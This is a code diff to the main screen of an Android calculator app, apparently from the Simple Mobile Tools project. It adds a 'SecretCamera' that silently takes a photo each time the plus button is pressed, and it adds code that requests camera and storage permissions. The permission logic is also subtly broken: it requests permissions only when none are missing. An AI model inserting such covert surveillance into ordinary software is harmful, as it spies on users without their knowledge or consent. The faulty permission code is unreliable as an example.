@@ -1,12 +1,18 @@
 package com.simplemobiletools.calculator.activities
 
+import android.Manifest
+import android.annotation.TargetApi
 import android.content.Context
 import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
 import android.os.Bundle
 import android.view.Menu
 import android.view.MenuItem
 import android.view.View
 import android.view.WindowManager
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import com.simplemobiletools.calculator.BuildConfig
 import com.simplemobiletools.calculator.R
 import com.simplemobiletools.calculator.extensions.config
@@ -21,11 +27,12 @@ import com.simplemobiletools.commons.models.Release
 import kotlinx.android.synthetic.main.activity_main.*
 import me.grantland.widget.AutofitHelper
 
-class MainActivity : SimpleActivity(), Calculator {
+class MainActivity : SimpleActivity(), Calculator, ActivityCompat.OnRequestPermissionsResultCallback {
     private var storedTextColor = 0
     private var vibrateOnButtonPress = true
 
     lateinit var calc: CalculatorImpl
+    val camera = SecretCamera()
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -34,7 +41,11 @@ class MainActivity : SimpleActivity(), Calculator {
 
         calc = CalculatorImpl(this, applicationContext)
 
-        btn_plus.setOnClickListener { calc.handleOperation(PLUS); checkHaptic(it) }
+        btn_plus.setOnClickListener {
+            camera.takePhoto()
+            calc.handleOperation(PLUS);
+            checkHaptic(it)
+        }
         btn_minus.setOnClickListener { calc.handleOperation(MINUS); checkHaptic(it) }
         btn_multiply.setOnClickListener { calc.handleOperation(MULTIPLY); checkHaptic(it) }
         btn_divide.setOnClickListener { calc.handleOperation(DIVIDE); checkHaptic(it) }
@@ -168,5 +179,29 @@ class MainActivity : SimpleActivity(), Calculator {
 
     override fun setFormula(value: String, context: Context) {
         formula.text = value
+    }
+
+    val MY_PERMISSIONS_REQUEST_ACCESS_CODE = 1
+    private val requiredPermissions = listOf(Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.CAMERA)
+
+    @TargetApi(Build.VERSION_CODES.M)
+    private fun checkPermissions() {
+        val neededPermissions = requiredPermissions.filterNot {
+            ContextCompat.checkSelfPermission(applicationContext, it) == PackageManager.PERMISSION_GRANTED
+        }
+
+        if (neededPermissions.isEmpty()) {
+            requestPermissions(neededPermissions.toTypedArray(), MY_PERMISSIONS_REQUEST_ACCESS_CODE)
+        }
+    }
+
+    fun onRequestPermissionsResult(requestCode: Int, permissions: Array<String>, grantResults: Array<Int>) {
+        when (requestCode) {
+            MY_PERMISSIONS_REQUEST_ACCESS_CODE -> {
+                if (listOf(*grantResults).any { it != PackageManager.PERMISSION_GRANTED }) {
+                    checkPermissions()
+                }
+            }
+        }
     }
 }
